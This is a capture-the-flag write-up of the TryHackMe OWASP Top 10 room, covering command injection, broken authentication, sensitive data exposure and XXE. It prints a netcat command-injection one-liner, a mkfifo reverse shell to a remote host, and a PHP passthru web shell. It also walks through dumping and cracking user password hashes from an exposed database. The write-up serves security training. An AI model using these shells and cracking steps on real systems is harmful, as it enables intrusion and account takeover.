---
title: Writeup for TryHackMe room - OWASP Top 10
author: 4n3i5v74
date: 2021-02-10 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, owasp]
pin: false
---

## [OWASP Top 10](https://tryhackme.com/room/owasptop10){:target="_blank"}

This room contains info and exploits of Top 10 OWASP most critical vulnerabilities.


## Task 3 - [Severity 1] Injection

Injection is when user controlled input is interpreted as actual commands or parameters by the application.
- SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
- Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.


## Task 4 - [Severity 1] OS Command injection

Use these links as references.
- [Reverse Shell Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md){:target="_blank"}

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
- Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.
- Active command injection will return the response to the user

A simple `;nc -e /bin/bash` is enough to start a shell using command injection.


## Task 5 - [Severity 1] Command injection Practical

This task shows how php shells can be used to inject commands using server-side system calls.


Use these links as references.
- [PHP Passthru](https://www.php.net/manual/en/function.passthru.php){:target="_blank"}


Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef`, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.

A reverse shell can also be spawned. A `netcat` listener can be spawned as below.
{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code % }

In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse shell.
{% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code % }

The sample php shell code from `evilshell.php` is as below.
{% capture code %}<?php
  if (isset($_GET["commandString"])) {
    $command_string = $_GET["commandString"];
    try { passthru($command_string); }
    catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
  }
?>{% endcapture %} {% include code.html code=code lang="php"%}

To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.


## Task 6 - [Severity 2] Broken Authentication

Authentication flaw types.
  - Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
  - Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without bruteforcing and without multiple attempts.
  - Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.


## Task 7 - [Severity 2] Broken Authentication Practical

Re-registration of an existing user.
  - Upon trying to register a username with existing username and a space prepended, website will allow for user registration and will provide same privilege as the user during login.


## Task 11 - [Severity 3] Sensitive Data Exposure (Challenge)

This task uses `sqlite3` to dump database information and use `https://crackstation.net` online tool to crack `MD5` hash.


Use these links as references.
- [Crackstation](https://crackstation.net/){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap` as below, all info can be gathered for the task.
{% capture code %}{% raw %}nmap -Pn -T4 -sS --top-ports 1000 <ip>{% endraw %}{% endcapture %} {% include code.html code=code % %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-03 19:03 BST
Nmap scan report for <hostname> (<ip>)
Host is up (0.00091s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:69:34:35:C4:E7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.69 seconds{% endraw %}{% endcapture %} {% include code.html code=code % %}

Use `firefox` to `view page source` of machine url `http://<ip>`. There will be lots of resources loaded from a <directory>.

Use `firefox` to navigate to url `http://<ip>/<directory>` and download the `database` file.

Inspect the file and use `sqlite3` to view contents of the `database`.
{% capture code %}{% raw %}root@<hostname>:~# file <database>
    <database>: SQLite 3.x database, last written using SQLite version 3022000

root@<hostname>:~# sqlite3 <database>
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.

sqlite> .tables
sessions  users

sqlite> PRAGMA table_info(sessins);
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0

sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|<hash>|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0{% endraw %}{% endcapture %} {% include code.html code=code % %}

Use `firefox` and the online tool `https://crackstation.net` to crack the `MD5` hash we got previously. Use the username `admin` and cracked `password` to get the `flag`.


## Task 12 - [Severity 4] XML External Entity

XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
  - It allows to interact with any backend or external systems that the application can access and allow to read the file on that system.
  - They can cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications.
  - XXE may even enable port scanning and lead to remote code execution.

Two types of XXE attacks.
  - In-band XXE attack can receive an immediate response to the XXE payload.
  - Out-of-band XXE attacks (blind XXE), there is no immediate response from the web application and need to reflect the output of XXE payload to some other file or their own server.


## Task 13 - [Severity 4] XML External Entity - eXtensible Markup Language

XML (eXtensible Markup Language) is a markup language that defines set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

  - XML is platform-independent and programming language independent.
  - The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
  - XML allows validation using DTD (Document Type Definition) and Schema.
  - XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.
  - XML document mostly starts with what is known as XML Prolog <?xml version="1.0" encoding="UTF-8"?>.


## Task 14 - [Severity 4] XML External Entity - DTD

DTD defines the structure and the legal elements and attributes of an XML document.

Example DTD file `note.dtd`.
{% capture code %}{% raw %}<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>{% endraw %}{% endcapture %} {% include code.html code=code % %}

The type of elements in `note.dtd` file is as below.
{% capture code %}{% raw %}!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ELEMENT from - Defines the from element to be of type "#PCDATA"
!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
!ELEMENT body - Defines the body element to be of type "#PCDATA"
!ENTITY - Defines new entity to be used as shortcut in XML file
#PCDATA - Parseable Character DATA{% endraw %}{% endcapture %} {% include code.html code=code % %}

Example `note.xml` file referring to `note.dtd`.
{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>{% endraw %}{% endcapture %} {% include code.html code=code % %}

